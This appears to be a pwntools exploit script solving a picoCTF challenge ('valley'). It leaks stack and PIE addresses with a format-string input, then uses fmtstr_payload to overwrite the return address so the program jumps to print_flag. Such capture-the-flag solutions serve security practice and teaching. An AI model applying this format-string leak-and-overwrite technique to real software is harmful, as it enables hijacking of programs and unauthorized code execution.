#!/usr/bin/env python3

from pwn import *

exe = ELF("./valley")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("shape-facility.picoctf.net", 49290)

    return r


def main():
    r = conn()

    r.sendline(b"%20$lx-%21$lx")
    r.recvuntil(b"distance: ")
    leaks = r.recvline().strip().split(b"-")

    ret_addr = int(leaks[0], 16) - 0x8
    exe.address = int(leaks[1], 16) - (exe.sym.main + 18)
    log.info(f"ret_addr: 0x{ret_addr:x}")
    log.info(f"PIE: 0x{exe.address:x}")

    payload = fmtstr_payload(6, {ret_addr: exe.sym.print_flag}, write_size="short")
    r.sendline(payload)

    r.clean(2)
    r.sendline(b"exit")
    flag = r.recvlines(2)[-1].decode()

    # The binary reads the flag in "/home/valley"...
    if args.LOCAL and b"Failed to open flag file" in flag:
        log.success("You would have gotten the flag if you were remote!")
    else:
        log.success(flag)


if __name__ == "__main__":
    main()
